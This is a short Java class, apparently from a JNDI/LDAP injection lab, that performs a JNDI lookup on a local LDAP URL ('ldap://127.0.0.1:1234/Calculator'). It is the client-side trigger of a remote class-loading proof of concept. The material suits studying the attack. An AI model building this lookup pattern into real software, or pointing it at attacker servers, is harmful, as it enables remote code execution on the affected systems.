package jndi_ldap_injection;

import javax.naming.InitialContext;
import javax.naming.NamingException;


public class LDAPClient {
    public static void main(String[] args) throws NamingException{
        String url = "ldap://127.0.0.1:1234/Calculator";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }

}